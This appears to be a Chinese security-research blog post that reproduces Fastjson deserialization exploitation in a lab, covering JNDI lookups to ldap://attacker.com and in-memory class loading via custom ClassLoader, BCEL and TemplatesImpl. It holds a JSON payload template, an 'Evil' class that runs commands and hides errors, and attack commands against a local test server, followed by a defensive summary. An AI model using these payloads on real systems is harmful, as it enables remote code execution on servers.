+++
title = "fastjson利用方面 出网和不出网"
date = 2026-06-29T15:30:11+08:00
draft = false
description = "漏洞复现"
tags = ["漏洞复现"]
categories = ["安全研究", "漏洞研究"]
series = ["Java 安全 持续学习"]
pin = false
+++

# 什么是出网和不出网


出网   靶机或者目标网站  能够访问 外网 （或者 vps）

不出网  靶机或者目标网站  不能够 访问  （被防火墙给限制，出不去）


# 出网

经典 jndi 注入思路  

```c
受害端 parseObject(payload)
   → JdbcRowSetImpl.setAutoCommit()
   → InitialContext.lookup("ldap://attacker.com/Exploit")
   → 向 attacker.com 拉取远程 Codebase
   → 加载 Reference 指定的远程类
```

依托 ldap 拉取远程服务器上恶意的类   如果不出网  那整个链子就废了

序列化的最终目的是将  字节码  塞到 jvm 执行命令  出网是借助外部的远程服务器上的恶意的类 

不出网只要通过一个方式或手段 达到 出网的效果就行了


# 不出网


核心的函数    defineClass   

ava.lang.ClassLoader` 提供了一个 native 方法：

```java
protected final Class<?> defineClass(byte[] b, int off, int len)
```

这个方法直接接收字节数组  完全不依赖文件系统  不依赖网络

而且 不管绕多少层 最终都会  走到这个链子  

所以只要目标  能够顺这个链子打进去就行


不出网的三种主流方式


| 方式               | 字节码载体                   | 适用场景               |
| ---------------- | ----------------------- | ------------------ |
| 自定义 ClassLoader  | 直接 `byte[]`             | 内存马、Agent 注入       |
| BCEL ClassLoader | `$$BCEL$$<encoded>` 字符串 | Fastjson、XBean 链   |
| TemplatesImpl    | Base64 编码的 `_bytecodes` | Fastjson、SnakeYAML |


## 1.自定义 ClassLoader

```java
public class MemoryClassLoader extends ClassLoader {
    public Class<?> loadFromBytes(byte[] bytecode) {
        return defineClass(null, bytecode, 0, bytecode.length);
    }
}
```

`defineClass` 被调用后，JVM 会：

1. 校验字节码格式
    
2. 生成 `Class` 对象
    
3. 执行 `<clinit>`（静态初始化块 `static {}`）
    

所以恶意代码必须写在 `static {}` 或构造方法里


实战中很少能直接让攻击者调用 `defineClass` 所以需要借助下面的 BCEL / TemplatesImpl 链


## 2. BCEL ClassLoader

什么是 这个  BCEL ClassLoader （Byte Code Engineering Library）字节码工程库

缺点是  

- JDK 8 内置版本在 `com.sun.org.apache.bcel.internal.*`
    
- JDK 9+ 开始逐步移除，到 JDK 12+ 已不可用

 核心机制

`com.sun.org.apache.bcel.internal.util.ClassLoader` 的 `loadClass` 方法会检查类名：

```java
if (className.startsWith("$$BCEL$$")) {
    // 解码后面的字符串 → 得到字节码 → defineClass
} else {
    // 走标准双亲委派
}
```

关键点：攻击者只需控制类名字符串，就能让目标在内存中加载任意字节码。

 编码方式

使用 `Utility.encode()`：

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;

byte[] bytecode = Files.readAllBytes(Paths.get("EvilCommand.class"));
String encoded = Utility.encode(bytecode, true);  // true = 压缩编码
String bcelClassName = "$$BCEL$$" + encoded;
```

 触发方式

```java
ClassLoader bcelLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
Class.forName(bcelClassName, true, bcelLoader);
//  ↑ 第二个参数 true 表示初始化，立即触发 static {}
```

实战关联

在 Fastjson / Tomcat dbcp 链中，攻击者通过控制 JNDI Reference 的 `className` 字段，
让目标加载 BCEL 类名 → 触发命令执行。


## 3.TemplatesImpl 链（Fastjson 经典）

完整的调用链    最经典

```c
JSON.parseObject(payload, Feature.SupportNonPublicField)
   → JSONObject 填充 _outputProperties 字段
   → 调用 setter / getter: getOutputProperties()
   → TemplatesImpl.getOutputProperties()
   → TemplatesImpl.newTransformer()
   → TemplatesImpl.getTransletInstance()
   → TemplatesImpl.defineTransletClasses()
   → defineClass(_bytecodes)              ← 字节码加载点
   → 恶意类 static {} 执行       
```

一般的payload 结构

```java
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["<Base64编码的EvilTranslet.class>"],
  "_name": "a.b",
  "_tfactory": {},
  "_outputProperties": {}
}
```

其中   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629145416758.png)


两个关键坑

坑 1：恶意类必须继承 AbstractTranslet

`defineTransletClasses` 内部校验：

```java
String superClassName = superClass.getName();  
if (superClassName.equals(ABSTRACT_TRANSLET)) {  
    // ABSTRACT_TRANSLET = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"  
    _transletIndex = i;  
}
```

校验失败 → 抛 `TransformerConfigurationException` → 链路中断。

正确写法：

```java
public class EvilTranslet extends AbstractTranslet {  
    static {  
        // 恶意代码  
    }  
​  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) {}  
​  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator,  
                          SerializationHandler handler) {}  
}
```

 坑 2：必须开启 Feature.SupportNonPublicField

`_bytecodes` / `_name` 等都是 `private` 字段，Fastjson 默认只填充 public 字段。

JSON.parseObject(payload, Feature.SupportNonPublicField);

> **注意**：Fastjson ≥ 1.2.25 之后默认关闭 AutoType，需要绕过黑名单。 主流绕过版本：1.2.47（缓存绕过）、1.2.68（expectClass 绕过）。


不出网的优势

 没有任何远程类加载请求
    
 字节码通过 Base64 塞在 JSON 字符串里
    
 完全在目标 JVM 内部完成

通用模板

```java
public class Evil {
    static {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] cmd = os.contains("win")
                    ? new String[]{"cmd.exe", "/c", "calc"}
                    : new String[]{"/bin/bash", "-c", "id"};

            Process p = Runtime.getRuntime().exec(cmd);
            // 读输出 ...
        } catch (Throwable t) {
            // 故意吞掉异常，避免提前暴露
        }
    }
}
```


# 漏洞复现


## 1.自定义 ClassLoader

```c
java -cp build MemoryClassLoader evil_class/EvilCommand.class
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629152223897.png)


## 2. BCEL ClassLoader

```c
java -cp build BcelLoaderDemo evil_class/EvilCommand.class.bcel.txt
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629152422142.png)


## 3.TemplatesImpl 链（Fastjson 经典）

输出执行  whoami 

```c
java -cp "build;libs/fastjson-1.2.24.jar" TemplatesImplPoc evil_class/EvilTranslet.class
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629152531273.png)



## 4.直观出网复现

启动漏洞服务端

```c
java -cp "build;libs/fastjson-1.2.24.jar" VulnerableServer
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629152654803.png)


发送并观察上一个窗口


```c
java -cp build PayloadSender build/payload_templatesimpl.json 127.0.0.1 9999
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260629152745933.png)



# 总结


```c
Fastjson 不出网利用
│
├── 根因：ClassLoader.defineClass(byte[]) 原生支持内存加载
│
├── 三条路
│   ├── 自定义 ClassLoader (直接 byte[])
│   ├── BCEL ClassLoader    ($$BCEL$$ 字符串解码)
│   └── TemplatesImpl       (Base64 _bytecodes)
│
├── TemplatesImpl 链核心
│   ├── 触发点：getOutputProperties()
│   ├── 字节码：_bytecodes (Base64)
│   ├── 校验：父类必须 AbstractTranslet
│   └── 关键：Feature.SupportNonPublicField
│
├── 版本演进
│   ├── ≤ 1.2.24  默认 AutoType 开
│   ├── 1.2.47    缓存绕过
│   ├── 1.2.68    safeMode
│   └── ≥ 1.2.83  基本封死
│
└── 防御
    ├── 升级 fastjson 2.x
    ├── safeMode = true
    ├── JEP 290 过滤器
    └── RASP 监控 defineClass / Runtime.exec
```

















